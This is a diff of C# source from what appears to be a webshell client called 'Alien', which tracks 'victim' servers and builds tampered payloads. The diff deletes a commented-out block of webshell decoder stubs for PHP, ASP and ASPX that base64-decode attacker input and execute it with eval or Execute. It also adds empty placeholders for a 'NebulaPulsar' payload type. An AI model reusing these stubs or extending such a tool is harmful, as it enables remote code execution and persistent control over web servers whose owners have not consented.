@@ -157,17 +157,6 @@ namespace Alien
             },
         };
 
-        /*
-        private Dictionary<enLanguage, string> m_dicDecodeFunc = new Dictionary<enLanguage, string>()
-        {
-            { enLanguage.PHP, "@eval(base64_decode('[PATTERN]'));" },
-            //{ enLanguage.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
-            { enLanguage.ASP, @"Execute(""On+Error+Resume+Next:Function+d(s):Set+x=CreateObject(""""MSXML2.DOMDocument""""):Set+e=x.createElement(""""t""""):e.dataType=""""bin.base64"""":e.text=s:Set+st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write+e.nodeTypedValue:st.Position=0:st.Type=2:st.CharSet=""""utf-8"""":d=st.ReadText:End+Function:Execute(d(""""[PATTERN]"""")):Response.End"")" },
-            //{ enLanguage.ASP, @"Execute(""On+Error+Resume+Next:Function+fg():Dim+c:c=Response.CharSet:If+c=""""+Then:Select+Case+Session.CodePage:Case+65001:c=""""utf-8"""":Case+1252:c=""""windows-1252"""":Case+936:c=""""gb2312"""":Case+950:c=""""big5"""":Case+1251:c=""""windows-1251"""":Case+Else:c=""""utf-8"""":End+Select:End+If:fg=c:End+Function:Function+d(s):Dim+x,n,st:Set+x=CreateObject(""""MSXML2.DOMDocument""""):Set+n=x.createElement(""""b64""""):n.dataType=""""bin.base64...""'""...text=s:Set+st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write+n.nodeTypedValue:st.Position=0:st.Type=2:st.Charset=fg():d=st.ReadText:st.Close:Set+st=Nothing:Set+n=Nothing:Set+x=Nothing:End+Function:Execute(d(Request(""""[PATTERN]""""))):Response.End"")" },
-            { enLanguage.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""UTF-8"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
-        };
-        */
-
         private Dictionary<enLanguage, Func<string, string?>> m_dicDecodeFunc = new Dictionary<enLanguage, Func<string, string?>>()
         {
             {
@@ -524,8 +513,6 @@ namespace Alien
                     {
                         CharSet = "; charset=" + m_victim.ShellEncoding,
                     };
-
-
                 }
                 else
                 {
@@ -752,6 +739,10 @@ namespace Alien
             {
                 szPayload = clsTamper.fnMergePayloadToOne(szPayload, asParams, m_victim.ShellLanguage);
             }
+            else if (m_victim.ShellPayloadType == enPayloadType.NebulaPulsar)
+            {
+
+            }
             else
             {
                 for (int i = 0; i < asParams.Length; i++)
@@ -852,6 +843,17 @@ namespace Alien
 
 
             return null;
+        }
+
+        /// <summary>
+        /// Payload module of NebulaPulsar
+        /// </summary>
+        /// <returns></returns>
+        private bool fnDarkMatter()
+        {
+
+
+            return true;
         }
 
         private static string fnWrapVBScript(string szOriginalPayload, string szEncryptor)
